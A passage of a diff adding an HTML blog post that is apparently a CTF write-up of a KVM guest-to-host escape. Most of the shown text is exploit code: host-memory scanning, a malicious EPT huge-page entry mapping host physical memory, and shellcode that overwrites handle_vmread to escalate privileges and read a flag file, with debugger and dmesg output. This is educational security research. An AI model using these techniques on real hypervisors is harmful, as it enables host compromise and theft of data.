+        <span class="n">neg_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">i</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x208</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+
+        <span class="n">pos_val</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">pos_offset</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">pos_val</span> <span class="o">==</span> <span class="n">IDT_BASE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">found_val</span> <span class="o">=</span> <span class="n">pos_val</span><span class="p">;</span>
+            <span class="n">found_offset</span> <span class="o">=</span> <span class="n">pos_offset</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">neg_val</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">neg_offset</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">neg_val</span> <span class="o">==</span> <span class="n">IDT_BASE</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">found_val</span> <span class="o">=</span> <span class="n">neg_val</span><span class="p">;</span>
+            <span class="n">found_offset</span> <span class="o">=</span> <span class="n">neg_offset</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">found_val</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: IDT NOT FOUND :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="o">*</span><span class="n">l1_vmcs_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: Found IDT in l1 at offset %lld; value: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">found_offset</span><span class="p">,</span> <span class="n">found_val</span><span class="p">);</span>
+        <span class="o">*</span><span class="n">l1_vmcs_offset</span> <span class="o">=</span> <span class="n">found_offset</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h3 id="finding-the-address-of-the-nested-vmcs">finding the address of the nested VMCS</h3>
+
+<p>After finding this, I wanted to figure out the virtual address the arb read/write is relative to in the host.
+I realized as I was reading the <code class="language-plaintext highlighter-rouge">handle_vmread</code> function that the <code class="language-plaintext highlighter-rouge">nested_vmx</code> struct holds a pointer to the nested guest’s VMCS: <code class="language-plaintext highlighter-rouge">cached_vmcs12</code>.
+It also contains some fields we know the values of: <code class="language-plaintext highlighter-rouge">vmxon_ptr</code> and <code class="language-plaintext highlighter-rouge">current_vmptr</code> which are the guest physical addresses for the VMXON region and VMCS we created.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">nested_vmx</span> <span class="p">{</span>
+    <span class="cm">/* Has the level1 guest done vmxon? */</span>
+    <span class="n">bool</span> <span class="n">vmxon</span><span class="p">;</span>
+    <span class="n">gpa_t</span> <span class="n">vmxon_ptr</span><span class="p">;</span>
+    <span class="n">bool</span> <span class="n">pml_full</span><span class="p">;</span>
+
+    <span class="cm">/* The guest-physical address of the current VMCS L1 keeps for L2 */</span>
+    <span class="n">gpa_t</span> <span class="n">current_vmptr</span><span class="p">;</span>
+    <span class="cm">/*
+     * Cache of the guest's VMCS, existing outside of guest memory.
+     * Loaded from guest memory during VMPTRLD. Flushed to guest
+     * memory during VMCLEAR and VMPTRLD.
+     */</span>
+    <span class="k">struct</span> <span class="n">vmcs12</span> <span class="o">*</span><span class="n">cached_vmcs12</span><span class="p">;</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So we can just scan for those two values:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">noinline</span> <span class="kt">int</span> <span class="nf">find_nested_vmx</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">nested_vmx_offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">pos_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">neg_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">zero_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pos_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">neg_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">found_val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">found_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">zero_val</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="mi">0ull</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"vmcs12[0] = %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">zero_val</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mh">0x4000</span><span class="o">*</span><span class="mh">0x200</span><span class="p">);</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">pos_offset</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+        <span class="n">neg_offset</span> <span class="o">=</span> <span class="o">-</span><span class="n">i</span><span class="p">;</span>
+
+        <span class="n">pos_val</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">pos_offset</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">pos_val</span> <span class="o">==</span> <span class="n">vmptrld_page_pa</span> <span class="o">&amp;&amp;</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">pos_offset</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="n">vmxon_page_pa</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">found_val</span> <span class="o">=</span> <span class="n">pos_val</span><span class="p">;</span>
+            <span class="n">found_offset</span> <span class="o">=</span> <span class="n">pos_offset</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">found_val</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: L1 VMCS NOT FOUND :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="o">*</span><span class="n">nested_vmx_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: Found vmcs in l1 at offset %lld; value: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">found_offset</span><span class="p">,</span> <span class="n">found_val</span><span class="p">);</span>
+        <span class="o">*</span><span class="n">nested_vmx_offset</span> <span class="o">=</span> <span class="n">found_offset</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="leaking-values">leaking values</h3>
+
+<p>With this we were done with memory scanning!</p>
+
+<p>We were then able to read fields of these two structures to find:</p>
+<ul>
+  <li>Where the nested VMCS is in virtual memory, via <code class="language-plaintext highlighter-rouge">cached_vmcs12</code>
+    <ul>
+      <li>We can also apply a bitmask this address to get phsymap base</li>
+    </ul>
+  </li>
+  <li>The EPTP from the <code class="language-plaintext highlighter-rouge">ept_pointer</code> field on the <code class="language-plaintext highlighter-rouge">vmcs12</code> struct we found</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// offset+1 to go from current_vmptr to cached_vmcs12</span>
+    <span class="n">l2_vmcs_addr</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">nested_vmx_offset</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: YOU ARE HERE: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">l2_vmcs_addr</span><span class="p">);</span>
+
+    <span class="n">physbase</span> <span class="o">=</span> <span class="n">l2_vmcs_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffffffull</span><span class="p">;</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: probably physbase: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">l2_vmcs_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffffff</span><span class="p">);</span>
+
+    <span class="n">eptp_value</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">l1_vmcs_offset</span><span class="o">-</span><span class="mi">50</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: eptp_value: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">eptp_value</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We calculated the offset to the EPT of the guest we are in using the knowledge of where our nested VMCS is, physmap base, and the EPTP (which is a physical address in the host):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">ept_addr</span> <span class="o">=</span> <span class="n">physbase</span> <span class="o">+</span> <span class="p">(</span><span class="n">eptp_value</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffull</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: ept_addr: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ept_addr</span><span class="p">);</span>
+
+    <span class="n">ept_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">ept_addr</span><span class="o">-</span><span class="n">l2_vmcs_addr</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: ept_offset: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ept_offset</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="ept-hijacking">EPT hijacking</h3>
+<p>With this knowledge we were able to read and write the EPT of the guest, and at this point it was time for me to actually figure out how this EPT stuff works.</p>
+
+<p>I’m just going to give a TL;DR on this because this blog is already really long…</p>
+
+<p>It turns out that if you understand how regular x86_64 page tables work, extended page tables are very intuitive.
+If you don’t understand those, then <a href="https://zolutal.github.io/understanding-paging/">learn how those work first</a>.</p>
+<ul>
+  <li>First the pagetables in the guest are walked as normal to convert the guest virtual address to a guest physical address</li>
+  <li>Next, the EPTP is used to determine the address of the physical address of the EPT in the host, you can think of this as the cr3 of EPT</li>
+  <li>Then a pagewalk starts on the EPT page tables converting the guest physical address to a host physical address
+    <ul>
+      <li>The procedure for this pagewalk is very similar to a normal pagewalk, you calculate the offsets into each level of the pagetable in the same way you do for linear to physical address conversion (e.g. shift left by 12, 9-bit bitmasks, etc.)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Also similar to normal paging there are huge pages in EPT!
+So the plan was to construct an EPT 1GB Huge Page mapping, which needs to be in the PDPT (3rd level).</p>
+
+<p>I walked one level of EPT by reading the first entry in the PML4 (4th level) to get the physical address of the PDPT.
+There was only one entry in the EPT PGD because of the amount of RAM the VM had wasn’t nearly enough to justify a second top level entry.</p>
+
+<p>Here is what the EPT PML4 and PDPT look like in memory:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; <span class="c"># physmap base:</span>
+gef&gt; p/x 0xffff8d74c0000000
+<span class="nv">$22</span> <span class="o">=</span> 0xffff8d74c0000000
+
+gef&gt; <span class="c"># EPTP value:</span>
+gef&gt; p/x 0x299405e
+<span class="nv">$23</span> <span class="o">=</span> 0x299405e
+
+gef&gt; <span class="c"># EPT PML4 addr:</span>
+gef&gt; p/x 0xffff8d74c0000000 + <span class="o">(</span>0x299405e &amp; ~0xfff<span class="o">)</span>
+<span class="nv">$24</span> <span class="o">=</span> 0xffff8d74c2994000
+gef&gt; <span class="c"># EPT PML4 contents:</span>
+gef&gt; x/4gx 0xffff8d74c2994000
+0xffff8d74c2994000:     0x0000000002482907      0x0000000000000000
+0xffff8d74c2994010:     0x0000000000000000      0x0000000000000000
+
+gef&gt; <span class="c"># the EPT PML4 has one entry: 0x0000000002482907</span>
+gef&gt; <span class="c"># EPT PDPT addr:</span>
+gef&gt; p/x 0xffff8d74c0000000 + <span class="o">(</span>0x0000000002482907 &amp; ~0xfff<span class="o">)</span>
+<span class="nv">$25</span> <span class="o">=</span> 0xffff8d74c2482000
+gef&gt; <span class="c"># EPT PDPT contents:</span>
+gef&gt; x/8gx 0xffff8d74c2482000
+0xffff8d74c2482000:     0x0000000002377907      0x0000000000000000
+0xffff8d74c2482010:     0x0000000000000000      0x000000000254d907
+0xffff8d74c2482020:     0x0000000000000000      0x0000000000000000
+0xffff8d74c2482030:     0x0000000000000000      0x0000000000000000
+</code></pre></div></div>
+
+<p>To insert the malicous EPT entry we wrote <code class="language-plaintext highlighter-rouge">0x987</code> into an entry in the EPT PDPT which means – map 1GB of host physical memory starting from physical address zero to the guest physical address associated with this entry.</p>
+<ul>
+  <li>The 0x9 nibble maps to the ‘accessed’ and ‘ignored’ bits (oops lol these don’t matter)</li>
+  <li>The 0x8 nibble maps to the page size bit that indicates this is 1GB mapping</li>
+  <li>The 0x7 nibble maps to the read, write, and ‘mode-based execute’ (whether ring 0 in the guest can fetch instructions from this memory) bits</li>
+</ul>
+
+<p>Peep the Intel SDM Vol. 3C Section 29.3.2 if you want specifics on the layouts of these entries.</p>
+
+<p>Here is walking the EPT PML4 and installing the malicous PDPT entry in C:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// read first entry in ept to get the PML4E</span>
+    <span class="n">pml4e_value</span> <span class="o">=</span> <span class="n">read_guy</span><span class="p">(</span><span class="n">ept_offset</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: pml4e_value: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pml4e_value</span><span class="p">);</span>
+
+    <span class="n">pml4e_addr</span> <span class="o">=</span> <span class="n">physbase</span> <span class="o">+</span> <span class="p">(</span><span class="n">pml4e_value</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffull</span><span class="p">);</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: pml4e_addr: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pml4e_addr</span><span class="p">);</span>
+
+    <span class="n">pml4e_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">pml4e_addr</span><span class="o">-</span><span class="n">l2_vmcs_addr</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: pml4e_offset: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pml4e_offset</span><span class="p">);</span>
+
+    <span class="c1">// at 6GB will be an identity mapping of the l1 memory in l2</span>
+    <span class="n">write_guy</span><span class="p">(</span><span class="n">pml4e_offset</span> <span class="o">+</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x987</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Then we were able to just mess with the guest’s page tables a bit and create a 1GB mapping that points to the guest physical address assocated with the malicious EPT  PDPT entry we installed.
+The entry was installed at the 6th entry in the EPT PDPT which associates it with the physical address <code class="language-plaintext highlighter-rouge">6&lt;&lt;30</code> (6GB), so we made a PDPT in the guest’s page tables point to that address:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">cr3</span> <span class="o">=</span> <span class="n">read_cr3</span><span class="p">();</span>
+    <span class="n">pgd</span> <span class="o">=</span> <span class="p">(</span><span class="n">cr3</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffull</span><span class="p">)</span> <span class="o">+</span> <span class="n">page_offset_base</span><span class="p">;</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"[exp]: pgd: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pgd</span><span class="p">);</span>
+
+    <span class="n">pgde_page</span> <span class="o">=</span> <span class="n">kzalloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+    <span class="n">pgde_page_pa</span> <span class="o">=</span> <span class="n">virt_to_phys</span><span class="p">(</span><span class="n">pgde_page</span><span class="p">);</span>
+
+    <span class="n">pgd</span><span class="p">[</span><span class="mi">272</span><span class="p">]</span> <span class="o">=</span> <span class="n">pgde_page_pa</span> <span class="o">|</span> <span class="mh">0x7</span><span class="p">;</span>
+
+    <span class="c1">// huge and rwxp</span>
+    <span class="n">l2_entry</span> <span class="o">=</span> <span class="mh">0x180000000</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">7</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x3</span><span class="p">;</span>
+
+    <span class="n">pgde_page</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">l2_entry</span><span class="p">;</span>
+
+    <span class="c1">// in THEORY I can access memory at 0xffff880000000000 now</span>
+    <span class="n">pr_info</span><span class="p">(</span><span class="s">"TEST: %llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffff880000000000</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>This entry makes it so that at virtual address <code class="language-plaintext highlighter-rouge">0xffff880000000000</code> is a 1GB mapping of the host’s physical memory in our guest.</p>
+
+<p>I was able to validate this by using gdb to compare the value the <code class="language-plaintext highlighter-rouge">pr_info</code> output to dmesg with the actual value at physical address zero:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; xp/gx 0
+0x0000000000000000:    0xf000ff53f000ff53                       |  S...S...
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[   99.596421] [exp]: pgd: ffff947a42a96000
+[   99.597523] clocksource: Long readout interval, skipping watchdog check: cs_nsec: 9953621305 wd_nsec: 1
+[   99.597611] TEST: f000ff53f000ff53
+</code></pre></div></div>
+
+<h3 id="arbitrary-physical-memory-readwrite">arbitrary physical memory read/write</h3>
+<p>At this point we had fully arbitrary physical memory read/write, e.g. we can read/write pages regardless of what their permissions are in the host by going through the mapping we established in the guest, which effectively turns this into a shellcoding exercise.</p>
+
+<p>We scanned memory to find the address of the <code class="language-plaintext highlighter-rouge">handle_vmread</code> function in physical memory and overwrote it with the following payload, which just privescs the current thread, then opens and reads the flag file into memory:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">push</span> <span class="n">rax</span>
+    <span class="n">push</span> <span class="n">rbx</span>
+    <span class="n">push</span> <span class="n">rcx</span>
+    <span class="n">push</span> <span class="n">rdx</span>
+    <span class="n">push</span> <span class="n">r9</span>
+    <span class="n">push</span> <span class="n">r10</span>
+    <span class="n">push</span> <span class="n">r11</span>
+    <span class="n">push</span> <span class="n">r12</span>
+    <span class="n">push</span> <span class="n">r13</span>
+    <span class="n">push</span> <span class="n">r14</span>
+    <span class="n">push</span> <span class="n">rdi</span>
+    <span class="n">push</span> <span class="n">rsi</span>
+
+    <span class="c1">// get kaslr base</span>
+    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0xfffffe0000000004</span>
+    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
+    <span class="n">sub</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x1008e00</span>
+
+    <span class="c1">// r12 is kaslr_base</span>
+    <span class="n">mov</span> <span class="n">r12</span><span class="p">,</span> <span class="n">rax</span>
+
+    <span class="c1">// commit_creds</span>
+    <span class="n">mov</span> <span class="n">r13</span><span class="p">,</span> <span class="n">r12</span>
+    <span class="n">add</span> <span class="n">r13</span><span class="p">,</span> <span class="mh">0xbdad0</span>
+
+    <span class="c1">// init_cred</span>
+    <span class="n">mov</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r12</span>
+    <span class="n">add</span> <span class="n">r14</span><span class="p">,</span> <span class="mh">0x1a52ca0</span>
+
+    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">r14</span>
+    <span class="n">call</span> <span class="n">r13</span>
+
+    <span class="c1">// filp_open</span>
+    <span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="n">r12</span>
+    <span class="n">add</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x292420</span>
+
+    <span class="c1">// push /root/flag.txt</span>
+    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x7478742e6761</span>
+    <span class="n">push</span> <span class="n">rax</span>
+    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x6c662f746f6f722f</span>
+    <span class="n">push</span> <span class="n">rax</span>
+    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsp</span>
+
+    <span class="c1">// O_RDONLY</span>
+    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="mi">0</span>
+    <span class="n">call</span> <span class="n">r11</span>
+
+    <span class="c1">// r10 is filp_ptr</span>
+    <span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rax</span>
+
+    <span class="c1">// kernel_read</span>
+    <span class="n">mov</span> <span class="n">r11</span><span class="p">,</span> <span class="n">r12</span>
+    <span class="n">add</span> <span class="n">r11</span><span class="p">,</span> <span class="mh">0x294c70</span>
+
+    <span class="c1">// writeable kernel address</span>
+    <span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r12</span>
+    <span class="n">add</span> <span class="n">r9</span><span class="p">,</span> <span class="mh">0x18ab000</span>
+
+    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">r10</span>
+    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">r9</span>
+    <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x100</span>
+    <span class="n">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mi">0</span>
+
+    <span class="n">call</span> <span class="n">r11</span>
+
+    <span class="n">pop</span> <span class="n">rax</span>
+    <span class="n">pop</span> <span class="n">rax</span>
+
+    <span class="n">pop</span> <span class="n">rsi</span>
+    <span class="n">pop</span> <span class="n">rdi</span>
+    <span class="n">pop</span> <span class="n">r13</span>
+    <span class="n">pop</span> <span class="n">r14</span>
+    <span class="n">pop</span> <span class="n">r12</span>
+    <span class="n">pop</span> <span class="n">r11</span>
+    <span class="n">pop</span> <span class="n">r10</span>
+    <span class="n">pop</span> <span class="n">r9</span>
+    <span class="n">pop</span> <span class="n">rdx</span>
+    <span class="n">pop</span> <span class="n">rcx</span>
+    <span class="n">pop</span> <span class="n">rbx</span>
+    <span class="n">pop</span> <span class="n">rax</span>
+</code></pre></div></div>
+
+<p>Then just trigger the shellcode by executing a vmread, and get the flag by reading it out of the host’s memory:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// do it</span>
+    <span class="n">read_guy</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// scan for flag in memory</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1024ull</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="mh">0xffff880000000000</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="s">"corctf{"</span><span class="p">,</span> <span class="mi">7</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">pr_info</span><span class="p">(</span><span class="s">"flag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mh">0xffff880000000000</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Incredibly this worked first try on remote! :)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[  127.014896] [exp]: Found vmcs in l1 at offset 730021; value: 2adb000
+[  127.014958] [exp]: YOU ARE HERE: ffff9aa4c1f6a000
+[  127.014959] [exp]: probably physbase: ffff9aa4c0000000
+[  127.014985] [exp]: eptp_value: 244f05e
+[  127.014986] [exp]: ept_addr: ffff9aa4c244f000
+[  127.014986] [exp]: ept_offset: 9ca00
+[  127.015012] [exp]: pml4e_value: 2ba4907
+[  127.015013] [exp]: pml4e_addr: ffff9aa4c2ba4000
+[  127.015013] [exp]: pml4e_offset: 187400
+[  127.015036] [exp]: pgd: ffff8c6102a80000
+[  127.016681] clocksource: Long readout interval, skipping watchdog check: cs_nsec: 5383022626 wd_nsec: 5383019837
+[  127.016772] TEST: f000ff53f000ff53
+[  127.018707] found handle_vmread page at: ffff8800028fd000
+[  127.018708] handle_vmread at: ffff8800028fd4d0
+[  127.053129] flag: corctf{KvM_3xpl01t5_@r3_5ucH_a_p@1n_1n_Th3_a55!!!}
+[  127.053129]
+</code></pre></div></div>
+
+<h2 id="wrap-up">wrap up</h2>
+
+<p>This challenge was super fun and very relevant with Google’s KVM CTF starting up not too long ago. It was awesome learning about EPT and getting a better understanding of some of the internals of KVM, and I hope you learned something from reading this! Shoutout to the author <a href="https://www.willsroot.io/">FizzBuzz101</a> for creating the challenge!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#architecture" class="page__taxonomy-item" rel="tag">Architecture</a><span class="sep">, </span>
+    
+      <a href="/tags/#ctf-writeup" class="page__taxonomy-item" rel="tag">CTF Writeup</a><span class="sep">, </span>
+    
+      <a href="/tags/#exploitation" class="page__taxonomy-item" rel="tag">Exploitation</a><span class="sep">, </span>
+    
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      <a href="/tags/#sidechannels" class="page__taxonomy-item" rel="tag">Sidechannels</a><span class="sep">, </span>
+    
+      <a href="/tags/#x86-64" class="page__taxonomy-item" rel="tag">x86_64</a>
+    
+    </span>
+  </p>
+
+
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-07-28T00:00:00+00:00">July 28, 2024</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/aslrnt/" class="pagination--pager" title="ASLRn’t: How memory alignment broke library ASLR
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/aslrnt/" rel="permalink">ASLRn’t: How memory alignment broke library ASLR
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-01-08T00:00:00+00:00">January 8, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
